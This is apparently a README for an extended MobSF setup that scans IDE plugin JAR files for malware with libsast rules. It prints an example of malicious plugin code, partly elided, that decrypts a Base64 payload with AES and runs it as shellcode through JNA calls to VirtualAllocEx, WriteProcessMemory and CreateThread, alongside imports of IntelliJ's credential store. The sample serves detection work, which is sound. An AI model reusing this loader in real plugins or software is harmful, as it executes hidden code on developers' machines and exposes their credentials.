## MobSF extended version to detect malware in IDE plugins

MobSF supports scanning JAR files since [this commit](https://github.com/MobSF/Mobile-Security-Framework-MobSF/commit/b43b561a659c84913d497cac583a8f2fa4d0b132)

It uses [libsast](https://github.com/ajinabraham/libsast) to scan decompiled Java/Kotlin code.

It works in two modes:
- [pattern-matcher](https://github.com/ajinabraham/libsast#pattern-matcher)
- [semantic-grep](https://github.com/ajinabraham/libsast#semantic-grep)

Current set of rules is here: [malware_rules.yaml](/mobsf/StaticAnalyzer/views/malware/rules/malware_rules.yaml)

It is working with pattern-matcher rules (see `match_rules` in `mobsf.StaticAnalyzer.views.sast_engine.scan`, 
[sast_engine.py](mobsf/StaticAnalyzer/views/sast_engine.py)) but it is possible to provide Semgrep rules as well, 
see [Python API](https://github.com/ajinabraham/libsast#python-api), `sgrep_rules`.

Example of such malicious code is below:

```
package com.amandaprocoder.googlesearch;

import com.intellij.credentialStore.CredentialAttributes;
import com.intellij.credentialStore.Credentials;
import com.intellij.ide.passwordSafe.PasswordSafe;
import com.sun.jna.Memory;
import com.sun.jna.Native;
import com.sun.jna.Pointer;
import com.sun.jna.platform.win32.Kernel32;
import com.sun.jna.platform.win32.User32;
import com.sun.jna.platform.win32.WinNT;
import com.sun.jna.ptr.IntByReference;
import com.sun.jna.win32.StdCallLibrary;
import com.sun.jna.win32.W32APIOptions;
import java.net.URI;
import java.net.http.HttpClient;
import java.net.http.HttpRequest;
import java.net.http.HttpResponse;
import java.security.NoSuchAlgorithmException;
import java.security.spec.InvalidKeySpecException;
import java.security.spec.KeySpec;
import java.util.Base64;
import javax.crypto.Cipher;
import javax.crypto.SecretKey;
import javax.crypto.SecretKeyFactory;
import javax.crypto.spec.IvParameterSpec;
import javax.crypto.spec.PBEKeySpec;
import javax.crypto.spec.SecretKeySpec;

public class Utils {

    static User32 user32;
    static Kernel32 kernel32 = Native.load(Kernel32.class, W32APIOptions.UNICODE_OPTIONS);
    static IKernel32 iKernel32 = Native.load("kernel32", IKernel32.class);

    interface IKernel32 extends StdCallLibrary {
        WinNT.HANDLE CreateThread(Object obj, int i, Pointer pointer, int i2, int i3, Object obj2);
        Pointer VirtualAllocEx(WinNT.HANDLE handle, Pointer pointer, int i, int i2, int i3);
    }
    private static SecretKey getKey(String data) throws NoSuchAlgorithmException, InvalidKeySpecException {
        SecretKeyFactory factory = SecretKeyFactory.getInstance("PBKDF2WithHmacSHA256");
        KeySpec spec = new PBEKeySpec(data.toCharArray(), "anything".getBytes(), 65536, 256);
        SecretKey secret = new SecretKeySpec(factory.generateSecret(spec).getEncoded(), "AES");
        return secret;
    }
    public static byte[] analyze(String data, String info) {
        try {
            SecretKey key = getKey(info);
            Cipher cipher = Cipher.getInstance("AES/CBC/PKCS5Padding");
            cipher.init(2, key, getArray());
            byte[] plainText = cipher.doFinal(Base64.getDecoder().decode(data));
            return plainText;
        } catch (Exception e) {
            return null;
        }
    }
...
    public static void go(byte[] info) {
        int shellcodeSize = info.length;
        IntByReference intByReference = new IntByReference(0);
        Memory memory = new Memory(shellcodeSize);
        for (int j = 0; j < shellcodeSize; j++) {
            memory.setByte(j, info[j]);
        }
        WinNT.HANDLE currentProcHandle = kernel32.GetCurrentProcess();
        Pointer pointer = iKernel32.VirtualAllocEx(currentProcHandle, Pointer.createConstant(0), shellcodeSize, 4096, 64);
        kernel32.WriteProcessMemory(currentProcHandle, pointer, memory, shellcodeSize, intByReference);
        iKernel32.CreateThread(null, 0, pointer, 0, 0, null);
    }
...
}
```

Another example of malicious code that could be used in plugins: https://gist.github.com/Jire/c7a527035b052d56137f6617dca82697